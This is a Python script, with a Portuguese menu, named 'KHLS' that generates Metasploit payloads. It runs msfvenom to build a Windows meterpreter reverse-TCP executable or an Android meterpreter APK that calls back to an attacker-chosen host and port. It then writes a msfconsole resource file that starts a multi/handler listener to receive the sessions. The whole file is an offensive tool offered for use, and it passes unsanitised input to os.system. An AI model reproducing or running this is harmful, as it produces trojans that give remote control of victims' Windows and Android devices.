#!/usr/bin/env python3
# -*- coding: utf-8 -*-

import os
import subprocess

def Payload_Msfvenon():
    os.system('\033[36m')
    os.system('clear')
    os.system('figlet .. GR - PAYLOAD')
    a1 = "1"
    a2 = "2"
    a3 = ""
    a4 = ""
    a5 = ""
    #i4 = "setterm -foreground yellow -background black -store"
    #i3 = "setterm -foreground blue -background black -store"
    #i2 = "setterm -foreground default -background default -store"
    #i = "setterm -foreground green -background black -store"
    r = "N"

    while r == "N":
        #subprocess.call("linux_logo")
        #os.system("{}".format(i))
        print("\033[0;0m\033[33m**************************** Autor LAUDIER-ST *************************")
        print("--------------------------   Versao KHLS 1.0  -------------------------\033[0;0m")
        print("#######################################################################")
        print("\033[32m\033[1m                                     KHLS                       \033[0;0m ")
        print("############################\033[32m\033[1m GERADOR DE PAYLOAD \033[0;0m#######################\n")
        print("#######################################################################\n")
        print("\033[36m%%%%%%%%%%%%%%%%%%%%%%%%%%%%%%%%%%%%%%%%%%%%%%%%%%%%%%%%%%%%%%%%%%%%%%%\033[0;0m")
        print("\033[32m\033[1m( 1 )\033[0;0m WINDOWS!  \033[32m\033[1m '$'   '$' '$' '& & &' '$   $' '$ $ $'  \033[0;0m                  ")
        print("\033[32m\033[1m( 2 )\033[0;0m ANDROID!  \033[32m\033[1m  '$' '$'  '$' '& & &' '$   $' '  \\    \033[0;0m                  ")
        print("\033[32m\033[1m( 3 )\033[0;0m SAIR!     \033[32m\033[1m    '&'    '$' '&  &'  '$ $ $' '$ $ $'  \033[0;0m                 ")
        print("\033[36m%%%%%%%%%%%%%%%%%%%%%%%%%%%%%%%%%%%%%%%%%%%%%%%%%%%%%%%%%%%%%%%%%%%%%%%\033[0;0m")
        m = "msfvenom -p windows/meterpreter/reverse_tcp LHOST="
        p = " LPORT="
        e = " -f exe > KHLSEXE.exe"
        a3 = input("\033[35m\033[1mDIGITE COM NUMERO UMA DAS OPÇÕES ACIMA PARA GERAR O SEU PAYLOAD!\033[0;0m\n\033[32m\033[1mDIGITE AQUI: \033[0;0m ")

        m2 = "msfvenom -p android/meterpreter/reverse_tcp LHOST="
        p2 = " LPORT="
        e2 = " R > KHLSAPP.apk"

        if a3 == a1:
            o1 = "mkdir output1 && cd output1 && touch msfconsole-r.rc && echo use multi/handler >> msfconsole-r.rc && echo set payload windows/meterpreter/reverse_tcp >> msfconsole-r.rc && echo set LHOST "
            o2 = ">> msfconsole-r.rc && echo set LPORT "
            o3 = ">> msfconsole-r.rc && set ExitOnSession false >> msfconsole-r.rc && echo set EnableStageEncoding true >> msfconsole-r.rc && echo exploit -j >> msfconsole-r.rc"

            #os.system("{}".format(i3))
            a4 = input("\033[34m"+"\033[1m"+"LHOST: ")
            a5 = input("LPORT: ")
            a6 = m + a4 + p + a5 + e
            o4 = o1 + a4 + o2 + a5 + o3
            os.system("{}".format(a6))
            os.system("{}".format(o4))
            #os.system("{}".format(i4))
            subprocess.call("clear")
            print("\nSEU PAYLOAD FOI CRIADO! ACESSE O DIRETORIO KHLS/output1/ E LÁ IRÁ TER DOIS ARQUIVOS, KHLSEXE.exe E O  msfconsole-r.rc COM OS COMANDOS PARA EXECULTAR COM METASPLOIT! Agora abra o terminal e digite msfconsole -r msfconsole-r.rc e da enter\n")

        elif a3 == a2:
            z1 = "mkdir output2 && cd output2 && touch msfconsole-r.rc && echo use multi/handler >> msfconsole-r.rc && echo set payload android/meterpreter/reverse_tcp >> msfconsole-r.rc && echo set LHOST "
            z2 = ">> msfconsole-r.rc && echo set LPORT "
            z3 = ">> msfconsole-r.rc && set ExitOnSession false >> msfconsole-r.rc && echo set EnableStageEncoding true >> msfconsole-r.rc && echo exploit -j >> msfconsole-r.rc"

            #os.system("{}".format(i3))
            a4 = input("\033[34m"+"\033[1m"+"LHOST: ")
            a5 = input("LPORT: ")
            a6 = m2 + a4 + p2 + a5 + e2
            z4 = z1 + a4 + z2 + a5 + z3
            os.system("{}".format(a6))
            os.system("{}".format(z4))
            #os.system("{}".format(i4))
            subprocess.call("clear")
            print("\nSEU PAYLOAD FOI CRIADO! ACESSE O DIRETORIO KHLS/output2/ E LÁ IRÁ TER DOIS ARQUIVOS, KHLSAPP.apk E O  msfconsole-r.rc COM OS COMANDOS PARA EXECULTAR COM METASPLOIT! Agora abra o terminal e digite msfconsole -r msfconsole-r.rc e da enter\n")
        print("=====================================================================")
        r = input(("\nQUER SAIR DO PROGRAMA? SE SIM (S) SE NÃO (N) ######[S/N]: ")).upper()
        print("=====================================================================")
        #os.system("{}".format(i2))
        subprocess.call("clear")
